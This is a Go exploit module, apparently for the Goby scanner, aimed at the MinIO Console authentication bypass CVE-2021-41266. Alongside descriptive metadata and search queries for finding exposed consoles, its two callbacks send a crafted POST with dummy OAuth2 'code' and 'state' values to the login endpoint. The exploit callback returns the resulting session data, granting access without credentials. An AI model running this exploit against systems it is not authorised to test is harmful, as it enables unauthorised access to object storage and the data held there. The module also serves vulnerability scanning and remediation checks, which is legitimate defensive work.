package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MinIO Console Information Disclosure (CVE-2021-41266)",
    "Description": "<p>Minio MinIO is an open source object storage server from MinIO (Minio) in the United States. The product supports the construction of infrastructure for machine learning, analytics, and application data workloads.</p><p>Minio 0.12.2 and earlier versions have an access control error vulnerability. When external IDP is enabled, the affected version will encounter authentication bypass issues in the console. Attackers can use vulnerabilities to obtain sensitive information to log in to the system.</p>",
    "Impact": "MinIO Console Information Disclosure (CVE-2021-41266)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36\">https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Minio Console",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Minio Console 信息泄露漏洞（CVE-2021-41266）",
            "Description": "<p>Minio MinIO是美国MinIO（Minio）公司的一款开源的对象存储服务器。该产品支持构建用于机器学习、分析和应用程序数据工作负载的基础架构。</p><p>Minio 0.12.2及其之前版本存在访问控制错误漏洞，在启用外部IDP时，受影响的版本会在控制台中遇到身份验证绕过问题。攻击者可利用漏洞获取敏感信息登录系统。</p>",
            "Impact": "<p>Minio 0.12.2及其之前版本存在访问控制错误漏洞，在启用外部IDP时，受影响的版本会在控制台中遇到身份验证绕过问题。攻击者可利用漏洞获取敏感信息登录系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36\">https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Minio Console",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "MinIO Console Information Disclosure (CVE-2021-41266)",
            "Description": "<p>Minio MinIO is an open source object storage server from MinIO (Minio) in the United States. The product supports the construction of infrastructure for machine learning, analytics, and application data workloads.</p><p>Minio 0.12.2 and earlier versions have an access control error vulnerability. When external IDP is enabled, the affected version will encounter authentication bypass issues in the console. Attackers can use vulnerabilities to obtain sensitive information to log in to the system.</p>",
            "Impact": "MinIO Console Information Disclosure (CVE-2021-41266)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36\">https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Minio Console",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "title=\"MinIO-Console\"",
    "GobyQuery": "title=\"MinIO-Console\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/minio/console",
    "DisclosureDate": "2021-12-01",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202111-1271"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-41266"
    ],
    "CNVD": [
        "CNVD-2021-88205"
    ],
    "CNNVD": [
        "CNNVD-202111-1271"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10240"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/api/v1/login/oauth2/auth`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = `{"code":"test","state":"test"}`
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return (resp.StatusCode == 200 || resp.StatusCode == 201) && strings.Contains(resp.RawBody, "sessionId")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := `/api/v1/login/oauth2/auth`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = `{"code":"test","state":"test"}`
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if (resp.StatusCode == 200 || resp.StatusCode == 201) && strings.Contains(resp.RawBody, "sessionId") {
					expResult.Output = resp.HeaderString.String() + "\n" + resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
